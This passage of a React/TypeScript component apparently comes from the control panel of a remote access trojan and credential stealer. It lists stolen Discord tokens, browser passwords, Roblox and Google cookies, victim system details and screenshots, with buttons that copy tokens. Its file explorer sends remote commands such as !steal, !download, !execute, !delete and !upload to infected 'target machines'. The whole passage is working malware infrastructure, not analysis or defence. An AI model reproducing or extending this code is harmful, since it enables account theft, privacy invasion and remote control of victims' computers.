          </div>

          {exfilLoading ? (
            <div className="flex justify-center py-12"><div className="w-5 h-5 border-2 border-zinc-600 border-t-primary rounded-full animate-spin" /></div>
          ) : exfilData.length === 0 ? (
            <div className="text-center py-12 rounded-xl border border-zinc-800 bg-zinc-900/60">
              <span className="text-4xl block mb-3">📭</span>
              <p className="text-zinc-400">No data collected yet</p>
              <p className="text-xs text-zinc-500 mt-1">Run the client on a target machine or send !steal command</p>
            </div>
          ) : (
            <>
              {/* Discord Tokens */}
              {exfilByType["discord_token"]?.length > 0 && (
                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800 flex items-center justify-between">
                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                      <span className="text-lg">💬</span> Discord Tokens ({exfilByType["discord_token"].length})
                    </h3>
                  </div>
                  <div className="divide-y divide-zinc-800">
                    {exfilByType["discord_token"].map((item: any, i: number) => {
                      let parsed: any = {}
                      try { parsed = JSON.parse(item.data) } catch {}
                      return (
                        <div key={item.id} className="p-4 hover:bg-zinc-800/30 transition-colors">
                          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
                            <div><span className="text-zinc-500">Username:</span> <span className="text-white font-medium">{parsed.username || "?"}</span></div>
                            <div><span className="text-zinc-500">User ID:</span> <span className="text-zinc-300 font-mono">{parsed.user_id || "?"}</span></div>
                            <div><span className="text-zinc-500">Email:</span> <span className="text-zinc-300">{parsed.email || "N/A"}</span></div>
                            <div><span className="text-zinc-500">Phone:</span> <span className="text-zinc-300">{parsed.phone || "N/A"}</span></div>
                            <div><span className="text-zinc-500">Nitro:</span> <span className="text-yellow-400 font-medium">{parsed.nitro || "None"}</span></div>
                            <div><span className="text-zinc-500">Valid:</span> <Badge variant="success" className="text-[10px]">✅ Yes</Badge></div>
                            <div className="col-span-2">
                              <span className="text-zinc-500">Token:</span>
                              <div className="flex items-center gap-2 mt-0.5">
                                <code className="text-[10px] text-zinc-300 bg-black/50 px-2 py-1 rounded break-all font-mono flex-1">{parsed.token?.substring(0, 40)}...</code>
                                <button
                                  onClick={() => { navigator.clipboard.writeText(parsed.token) }}
                                  className="px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-[10px] text-zinc-300 transition-colors"
                                >Copy</button>
                              </div>
                            </div>
                          </div>
                          <p className="text-[10px] text-zinc-600 mt-2">{new Date(item.createdAt).toLocaleString()}</p>
                        </div>
                      )
                    })}
                  </div>
                </div>
              )}

              {/* Browser Passwords */}
              {exfilByType["browser_passwords"]?.length > 0 && (
                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800">
                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                      <span className="text-lg">🔑</span> Browser Passwords ({exfilByType["browser_passwords"].length})
                    </h3>
                  </div>
                  <div className="divide-y divide-zinc-800">
                    {exfilByType["browser_passwords"].map((item: any) => {
                      let parsed: any = {}
                      try { parsed = JSON.parse(item.data) } catch {}
                      return (
                        <div key={item.id} className="p-4 hover:bg-zinc-800/30">
                          <div className="flex items-center justify-between mb-2">
                            <Badge variant="warning" className="text-[10px]">{item.source || "Browser"}</Badge>
                            <span className="text-[10px] text-zinc-500">{new Date(item.createdAt).toLocaleString()}</span>
                          </div>
                          <p className="text-xs text-zinc-400 mb-2">{parsed.urls_found} saved login URLs found</p>
                          {parsed.urls && parsed.urls.length > 0 && (
                            <div className="max-h-32 overflow-y-auto bg-black/50 rounded-lg p-2">
                              {parsed.urls.map((url: string, i: number) => (
                                <p key={i} className="text-[10px] text-zinc-500 font-mono truncate">{url}</p>
                              ))}
                            </div>
                          )}
                          {parsed.note && <p className="text-[10px] text-zinc-600 mt-2">{parsed.note}</p>}
                        </div>
                      )
                    })}
                  </div>
                </div>
              )}

              {/* System Info */}
              {exfilByType["system_info"]?.length > 0 && (
                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800">
                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                      <span className="text-lg">🖥️</span> System Info ({exfilByType["system_info"].length})
                    </h3>
                  </div>
                  {exfilByType["system_info"].slice(-1).map((item: any) => {
                    let parsed: any = {}
                    try { parsed = JSON.parse(item.data) } catch {}
                    return (
                      <div key={item.id} className="p-4 grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
                        {[
                          { l: "Hostname", v: parsed.hostname },
                          { l: "Username", v: parsed.username },
                          { l: "OS", v: parsed.os },
                          { l: "Public IP", v: parsed.public_ip },
                          { l: "Local IP", v: parsed.local_ip },
                          { l: "Hardware ID", v: parsed.hardware_id },
                          { l: "CPU", v: parsed.cpu ? `${parsed.cpu}%` : "-" },
                          { l: "RAM", v: parsed.ram_total_gb ? `${parsed.ram_used_gb?.toFixed(1) || 0} / ${parsed.ram_total_gb?.toFixed(1)} GB` : "-" },
                        ].map(({ l, v }) => (
                          <div key={l} className="p-2 rounded bg-zinc-800/30"><span className="text-zinc-500">{l}: </span><span className="text-zinc-300 font-mono">{v || "-"}</span></div>
                        ))}
                      </div>
                    )
                  })}
                </div>
              )}

              {/* Other data types */}
              {Object.entries(exfilByType).filter(([t]) => !["discord_token", "browser_passwords", "system_info"].includes(t)).map(([type, items]) => (
                <div key={type} className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800">
                    <h3 className="text-sm font-semibold text-white capitalize">{type.replace(/_/g, " ")} ({items.length})</h3>
                  </div>
                  <div className="p-4 space-y-2">
                    {items.map((item: any) => (
                      <div key={item.id} className="p-3 rounded-lg bg-zinc-800/30">
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-[10px] text-zinc-500">{item.source || "-"}</span>
                          <span className="text-[10px] text-zinc-600">{new Date(item.createdAt).toLocaleString()}</span>
                        </div>
                        <pre className="text-xs text-zinc-300 whitespace-pre-wrap break-all max-h-32 overflow-y-auto">{item.data}</pre>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </>
          )}
        </div>
      )}

      {/* BASEDATA TAB — Session Collection */}
      {activeTab === "basedata" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">💾 Session Collection</h2>
            <Button size="sm" onClick={fetchExfilData} loading={exfilLoading}>Refresh</Button>
          </div>

          <div className="grid md:grid-cols-3 lg:grid-cols-5 gap-3">
            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
              <span className="text-3xl font-bold text-yellow-400">{exfilByType["discord_token"]?.length || 0}</span>
              <p className="text-[10px] text-zinc-500 uppercase mt-1">Discord</p>
            </div>
            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
              <span className="text-3xl font-bold text-blue-400">{exfilByType["browser_passwords"]?.length || 0}</span>
              <p className="text-[10px] text-zinc-500 uppercase mt-1">Passwords</p>
            </div>
            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
              <span className="text-3xl font-bold text-green-400">{client.screenCaptures?.length || 0}</span>
              <p className="text-[10px] text-zinc-500 uppercase mt-1">Screenshots</p>
            </div>
            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
              <span className="text-3xl font-bold text-orange-400">{exfilByType["roblox_cookies"]?.length || 0}</span>
              <p className="text-[10px] text-zinc-500 uppercase mt-1">Roblox</p>
            </div>
            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
              <span className="text-3xl font-bold text-red-400">{exfilByType["google_cookies"]?.length || 0}</span>
              <p className="text-[10px] text-zinc-500 uppercase mt-1">Google</p>
            </div>
          </div>

          {/* Discord Tokens */}
          {exfilByType["discord_token"]?.length > 0 && (
            <div className="rounded-xl border border-yellow-500/20 bg-zinc-900/60 overflow-hidden">
              <div className="p-3 border-b border-zinc-800 bg-yellow-500/5">
                <h3 className="text-xs font-semibold text-yellow-400">💬 Discord Tokens</h3>
              </div>
              <div className="divide-y divide-zinc-800 max-h-60 overflow-y-auto">
                {exfilByType["discord_token"].map((item: any) => {
                  let p: any = {}
                  try { p = JSON.parse(item.data) } catch {}
                  return (
                    <div key={item.id} className="p-3 hover:bg-zinc-800/30">
                      <div className="flex items-center gap-2 text-[10px]">
                        <span className="text-zinc-500">User:</span>
                        <span className="text-white font-medium">{p.username || "?"}</span>
                        {p.email && <span className="text-zinc-400">({p.email})</span>}
                      </div>
                      <div className="flex items-center gap-2 mt-1">
                        <code className="text-[10px] text-zinc-500 bg-black/40 px-2 py-0.5 rounded font-mono flex-1 truncate">{p.token?.substring(0, 40)}...</code>
                        <button onClick={() => { navigator.clipboard.writeText(p.token || item.data) }} className="text-[9px] px-1.5 py-0.5 rounded bg-zinc-700 hover:bg-zinc-600 text-zinc-300 shrink-0">Copy</button>
                      </div>
                    </div>
                  )
                })}
              </div>
            </div>
          )}

          {/* Screenshots */}
          {client.screenCaptures?.length > 0 && (
            <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
              <div className="p-3 border-b border-zinc-800">
                <h3 className="text-xs font-semibold text-green-400">📸 Screenshots</h3>
              </div>
              <div className="p-3 grid grid-cols-3 gap-2 max-h-60 overflow-y-auto">
                {client.screenCaptures.map((sc: any) => (
                  <img key={sc.id} src={sc.imagePath} alt="Screen" className="rounded-lg border border-zinc-700 cursor-pointer hover:border-primary/50 hover:scale-105 transition-all" onClick={() => { setScreenshot(sc.imagePath); setActiveTab("screen") }} />
                ))}
              </div>
            </div>
          )}

          {/* End Session Button */}
          <div className="rounded-2xl border border-red-500/20 bg-red-500/5 p-6">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-xl bg-red-500/10 flex items-center justify-center text-2xl shrink-0">
                ⏹️
              </div>
              <div className="flex-1">
                <h3 className="text-sm font-bold text-red-400">End Session & Save Data</h3>
                <p className="text-xs text-zinc-400 mt-1">
                  This will save all collected tokens, passwords, screenshots, and system info to the Data Base.
                  The client connection will be terminated and the session finalized.
                </p>
                <div className="flex items-center gap-3 mt-4">
                  <Button
                    variant="danger"
                    onClick={async () => {
                      try {
                        await sendCommand("!exit")
                        toast.success("Exit command sent. Session ending...")
                      } catch { toast.error("Failed to send exit") }
                    }}
                  >
                    🔴 End Session
                  </Button>
                  <p className="text-[10px] text-zinc-500">All collected data is already saved to Data Base.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* FILE EXPLORER TAB */}
      {activeTab === "explorer" && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">📁 File Explorer</h2>
            <Button size="sm" onClick={() => listDirectory(filePath)} loading={fileLoading}>Refresh</Button>
          </div>
          <div className="flex items-center gap-2 p-3 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <button onClick={goUp} className="shrink-0 px-2 py-1 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-xs text-zinc-300 font-mono">⬆ Up</button>
            <input type="text" value={filePath} onChange={e => setFilePath(e.target.value)} onKeyDown={e => { if (e.key === "Enter") navigateTo(filePath) }} className="flex-1 bg-transparent text-sm font-mono text-zinc-300 outline-none" />
            <Button size="sm" onClick={() => navigateTo(filePath)}>Go</Button>
          </div>
          <div className="flex items-center gap-2 text-[10px]">
            {["C:\\", "C:\\Users", "C:\\Windows", "C:\\Windows\\System32", "D:\\"].map(p => (
              <button key={p} onClick={() => navigateTo(p)} className="px-2 py-1 rounded-md bg-zinc-800/50 text-zinc-400 hover:bg-zinc-700 hover:text-white font-mono">{p}</button>
            ))}
          </div>
          <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
            {fileLoading ? (
              <div className="flex justify-center py-12"><div className="w-5 h-5 border-2 border-zinc-600 border-t-primary rounded-full animate-spin" /></div>
            ) : (
              <div className="p-4 font-mono text-xs text-green-400/80 whitespace-pre-wrap max-h-[50vh] overflow-y-auto bg-black/50">
                {fileOutput || "Type a path and press Go to list directory..."}
              </div>
            )}
          </div>
          <div className="grid grid-cols-3 gap-2">
            {[
              { label: "List Files", cmd: "!dir" },
              { label: "Current Dir", cmd: "!currentdir" },
              { label: "Download", cmd: "!download " },
              { label: "Delete", cmd: "!delete " },
              { label: "Execute", cmd: "!execute " },
              { label: "Upload", cmd: "!upload " },
            ].map(({ label, cmd }) => (
              <button key={cmd} onClick={() => sendCommand(cmd)} className="p-2 rounded-lg bg-zinc-800/50 border border-zinc-700/50 hover:bg-zinc-700 text-[10px] text-zinc-300 font-mono">{label}</button>
            ))}
          </div>
        </div>
      )}

      {/* ACTIVITY LOGS TAB */}
      {activeTab === "activity" && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-muted-foreground">📋 Activity Timeline</h2>
          </div>
          <div className="rounded-2xl border border-border/50 bg-card/60 p-5">
            <div className="space-y-3">
              {/* Connection event */}
              <div className="flex items-start gap-3">
                <div className="mt-0.5 w-2 h-2 rounded-full bg-green-500 shrink-0" />
                <div className="flex-1 min-w-0">
                  <p className="text-xs text-foreground font-medium">Device First Seen</p>
                  <p className="text-[10px] text-muted-foreground">{new Date(client.firstSeen).toLocaleString()}</p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <div className={`mt-0.5 w-2 h-2 rounded-full shrink-0 ${isOnline ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
                <div className="flex-1 min-w-0">
                  <p className="text-xs text-foreground font-medium">{isOnline ? "Currently Online" : "Offline"}</p>
                  <p className="text-[10px] text-muted-foreground">Last heartbeat: {new Date(client.lastSeen).toLocaleString()}</p>
                </div>
              </div>
              {/* Screenshots */}
              {client.screenCaptures?.map((sc: any, i: number) => (
                <div key={sc.id} className="flex items-start gap-3">
                  <div className="mt-0.5 w-2 h-2 rounded-full bg-blue-500 shrink-0" />
                  <div className="flex-1 min-w-0">
                    <p className="text-xs text-foreground font-medium">Screenshot Captured</p>
                    <p className="text-[10px] text-muted-foreground">
                      {sc.width && sc.height ? `${sc.width}x${sc.height} · ` : ""}
                      {new Date(sc.createdAt).toLocaleString()}
                    </p>
                    {sc.imagePath && (
                      <img src={sc.imagePath} alt="Screen" className="mt-2 rounded-lg border border-border/30 max-h-24 cursor-pointer hover:scale-105 transition-transform"
                        onClick={() => { setScreenshot(sc.imagePath); setActiveTab("screen") }} />
                    )}
                  </div>
                </div>
              ))}
              {/* Commands */}
              {client.commands?.slice(0, 15).map((cmd: any) => (
                <div key={cmd.id} className="flex items-start gap-3">
                  <div className={`mt-0.5 w-2 h-2 rounded-full shrink-0 ${cmd.status === "completed" ? "bg-green-500" : cmd.status === "failed" ? "bg-red-500" : "bg-yellow-500"}`} />
                  <div className="flex-1 min-w-0">
                    <p className="text-xs text-foreground">
                      <code className="text-primary font-mono">{cmd.command}</code>
                      <span className={`ml-2 text-[10px] ${cmd.status === "completed" ? "text-green-400" : cmd.status === "failed" ? "text-red-400" : "text-yellow-400"}`}>
                        {cmd.status || "pending"}
                      </span>
                    </p>
                    {cmd.output && <p className="text-[10px] text-muted-foreground mt-0.5 whitespace-pre-wrap max-h-20 overflow-y-auto">{cmd.output.substring(0, 200)}</p>}
                    <p className="text-[9px] text-muted-foreground/50 mt-0.5">{new Date(cmd.executedAt || cmd.createdAt).toLocaleString()}</p>
                  </div>
                </div>
              ))}
              {/* File transfers */}
              {client.fileTransfers?.slice(0, 10).map((ft: any) => (
                <div key={ft.id} className="flex items-start gap-3">
                  <div className={`mt-0.5 w-2 h-2 rounded-full shrink-0 ${ft.direction === "upload" ? "bg-purple-500" : "bg-cyan-500"}`} />
                  <div className="flex-1 min-w-0">
                    <p className="text-xs text-foreground">{ft.direction === "upload" ? "⬆ Upload" : "⬇ Download"}: {ft.fileName}</p>
                    <p className="text-[10px] text-muted-foreground">
                      {ft.fileSize ? `${(ft.fileSize / 1024).toFixed(1)}KB · ` : ""}
                      {ft.status} · {new Date(ft.startedAt).toLocaleString()}
                    </p>
                  </div>
                </div>
              ))}
              {!client.screenCaptures?.length && !client.commands?.length && !client.fileTransfers?.length && (
                <p className="text-xs text-muted-foreground text-center py-8">No activity recorded yet. Send a command to get started.</p>
              )}
            </div>
          </div>
        </div>
      )}
    </motion.div>
  )
}
